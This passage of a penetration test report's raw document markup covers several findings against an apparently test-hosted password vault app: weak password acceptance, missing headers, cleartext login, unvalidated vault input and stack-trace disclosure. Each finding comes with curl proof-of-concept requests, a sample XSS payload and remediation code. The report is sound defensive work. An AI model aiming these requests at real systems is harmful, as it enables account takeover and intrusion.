        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 8:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Vault access with weak password "1" succeeds</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Scenario 1: Different passwords (current ≠ new) - REJECTED</w:t>
        <w:br/>
        <w:t>curl -X POST http://10.0.0.10/account/update \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=s%3AAChb3MR4SusoRGaXfvYVibg4Qy3T80BG.hTpIAL9ZY5c7Fno4586SMirVt6TixYHiD%2F2DtqYn%2Bj8" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"password":"csrfhacked123","updatedPassword":"1","updateField":"account"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>Response: {"success":false,"message":"Passwords do not match."}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Scenario 2: Same weak password (current = new) - ACCEPTED</w:t>
        <w:br/>
        <w:t>curl -X POST http://10.0.0.10/account/update \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=s%3AAChb3MR4SusoRGaXfvYVibg4Qy3T80BG.hTpIAL9ZY5c7Fno4586SMirVt6TixYHiD%2F2DtqYn%2Bj8" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"password":"1","updatedPassword":"1","updateField":"account"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>Response: {"success":true,"message":"Account password updated successfully!"}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Scenario 3: Vault password with same weak password - ACCEPTED</w:t>
        <w:br/>
        <w:t>curl -X POST http://10.0.0.10/account/update \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=s%3AAChb3MR4SusoRGaXfvYVibg4Qy3T80BG.hTpIAL9ZY5c7Fno4586SMirVt6TixYHiD%2F2DtqYn%2Bj8" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"password":"1","updatedPassword":"1","updateField":"vault"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>Response: {"success":true,"message":"Vault password updated successfully!"}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Subsequent login with weak password succeeds</w:t>
        <w:br/>
        <w:t>curl -X POST http://10.0.0.10/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"testuser","password":"1"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>Response: {"success":true,"message":"Login successful."}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 8: Missing Security Headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> MEDIUM (CVSS 5.3)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application lacks important security headers that protect against common attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Missing Headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>X-Frame-Options: DENY</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Clickjacking protection)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>X-Content-Type-Options: nosniff</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (MIME type sniffing)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Content-Security-Policy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (XSS/Injection protection)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Strict-Transport-Security</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (HTTPS enforcement)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>X-XSS-Protection: 1; mode=block</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Legacy XSS protection)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>app.use((req, res, next) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  res.setHeader('X-Frame-Options', 'DENY');</w:t>
        <w:br/>
        <w:t xml:space="preserve">  res.setHeader('X-Content-Type-Options', 'nosniff');</w:t>
        <w:br/>
        <w:t xml:space="preserve">  res.setHeader('X-XSS-Protection', '1; mode=block');</w:t>
        <w:br/>
        <w:t xml:space="preserve">  res.setHeader('Content-Security-Policy', "default-src 'self'");</w:t>
        <w:br/>
        <w:t xml:space="preserve">  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');</w:t>
        <w:br/>
        <w:t xml:space="preserve">  next();</w:t>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Send a GET request to the homepage or any endpoint using curl or Burp.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Inspect the HTTP response headers.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Note the absence of security headers like X-Frame-Options, X-Content-Type-Options, Content-Security-Policy, etc.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Use Burp Suite to analyze the headers for missing protections.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTTP response headers showing missing security headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Burp response headers analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Request/Response Evidence:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HEAD / HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 10.0.0.10</w:t>
        <w:br/>
        <w:t>User-Agent: curl/8.17.0</w:t>
        <w:br/>
        <w:t>Accept: */*</w:t>
        <w:br/>
        <w:t>Connection: keep-alive</w:t>
        <w:br/>
        <w:br/>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>Date: Tue, 20 Jan 2026 00:43:41 GMT</w:t>
        <w:br/>
        <w:t>Content-Type: text/html; charset=utf-8</w:t>
        <w:br/>
        <w:t>Content-Length: 7634</w:t>
        <w:br/>
        <w:t>Connection: keep-alive</w:t>
        <w:br/>
        <w:t>X-Powered-By: Express</w:t>
        <w:br/>
        <w:t>ETag: W/"1dd2-KW1CYVEDzWSSo/KBW1Y8YFni+FM"</w:t>
        <w:br/>
        <w:t>Set-Cookie: connect.sid=s%3A3V-nw9UaFTN1tODfbFatJYVS6YVp5RrZ.66WmYnyoqtaGWSi1JLlLVdjmpz8Frv0GlbKCPgN2q0A; Path=/; HttpOnly</w:t>
        <w:br/>
        <w:t>Cache-Control: no-cache</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -I http://10.0.0.10</w:t>
        <w:br/>
        <w:br/>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>Date: Tue, 20 Jan 2026 00:41:35 GMT</w:t>
        <w:br/>
        <w:t>Content-Type: text/html; charset=utf-8</w:t>
        <w:br/>
        <w:t>Content-Length: 7634</w:t>
        <w:br/>
        <w:t>Connection: keep-alive</w:t>
        <w:br/>
        <w:t>X-Powered-By: Express</w:t>
        <w:br/>
        <w:t>ETag: W/"1dd2-KW1CYVEDzWSSo/KBW1Y8YFni+FM"</w:t>
        <w:br/>
        <w:t>Set-Cookie: connect.sid=s%3AREErDQ8Zd9s9_pnhjW6AIbqPPy69IrLs.oo7IEvt4d2361E9rf8SXcG7XgzXYtyo8ko0xPY2r6zM; Path=/; HttpOnly</w:t>
        <w:br/>
        <w:t>Cache-Control: no-cache</w:t>
        <w:br/>
        <w:br/>
        <w:t># Missing Security Headers:</w:t>
        <w:br/>
        <w:t># - X-Frame-Options: NOT PRESENT (Clickjacking protection missing)</w:t>
        <w:br/>
        <w:t># - X-Content-Type-Options: NOT PRESENT (MIME type sniffing protection missing)</w:t>
        <w:br/>
        <w:t># - Content-Security-Policy: NOT PRESENT (XSS/Injection protection missing)</w:t>
        <w:br/>
        <w:t># - Strict-Transport-Security: NOT PRESENT (HTTPS enforcement missing)</w:t>
        <w:br/>
        <w:t># - X-XSS-Protection: NOT PRESENT (Legacy XSS protection missing)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 9: Cleartext Password Submission</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HIGH (CVSS 7.5)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Passwords are submitted over HTTP (not HTTPS) in the test environment, exposing credentials to network interception.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Deploy HTTPS with valid SSL/TLS certificates</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Enforce HSTS headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Redirect all HTTP to HTTPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ensure the application is accessed over HTTP (not HTTPS).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login with valid username and password.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Use Burp Suite Proxy to intercept the POST /login request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Inspect the request body to see the password submitted in cleartext JSON.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Note the lack of encryption exposing credentials to network interception.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Burp Suite intercept showing POST /login request over HTTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Request body showing password in cleartext JSON</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># All requests are over HTTP (via Burp Suite proxy)</w:t>
        <w:br/>
        <w:t>curl -X POST http://10.0.0.10/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"test","password":"password123"}' \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -x 127.0.0.1:8080</w:t>
        <w:br/>
        <w:br/>
        <w:t># Burp Suite intercept shows password in cleartext JSON over HTTP</w:t>
        <w:br/>
        <w:t>POST /login HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 10.0.0.10</w:t>
        <w:br/>
        <w:t>Content-Type: application/json</w:t>
        <w:br/>
        <w:br/>
        <w:t>{"username":"test","password":"password123"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 10: Lack of Input Validation on Vault Items</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> LOW (CVSS 3.1)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Vault item fields (title, username, password) accept any input without validation. While XSS is sanitized on display, stored data could be exploited if display logic changes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Implement server-side input validation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Whitelist allowed characters</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Enforce field length limits</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sanitize on both input and output</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Login to the application.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Navigate to vault and click "Add Item".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enter data with special characters or potential XSS payloads, e.g., title: "&lt;script&gt;alert(1)&lt;/script&gt;".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Submit the form.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>View the vault items to see the data stored without validation or sanitization.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Vault add form accepting any input</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Stored data with no validation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/vault/add \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Cookie: connect.sid=[session]" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"vaulttitle":"&lt;script&gt;alert(1)&lt;/script&gt;","vaultusername":"test","vaultpassword":"test"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Item added without validation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 11: Information Disclosure - Error Messages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> MEDIUM (CVSS 5.3)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The application exposes internal stack traces, file paths, and technology fingerprinting information in error responses for malformed JSON requests. This allows attackers to identify the technology stack and internal application structure for reconnaissance and targeted attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerability Details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoints:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> POST /login, POST /register</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Trigger:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Malformed JSON in request body</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTTP 400 with full stack trace</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Fingerprinting Information Exposed:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Node.js runtime version</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Express.js framework</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>body-parser middleware version</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Internal file paths (/usr/app/node_modules/)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Application root directory structure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Proof of Concept</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"test","password"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTTP 400 with stack trace revealing:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Node.js version and paths (/usr/app/node_modules/)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Technology stack (Express, body-parser)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Internal error details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Technology Fingerprinting:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Attackers identify Node.js, Express.js, body-parser versions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Reconnaissance:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Understand application structure and internal directory layout (/usr/app/)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vulnerability Identification:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Identify specific library versions that may have known CVEs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Targeted Attacks:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Use fingerprinting information to craft version-specific exploits</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Internal Path Disclosure:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Reveals application root and dependency locations for further reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
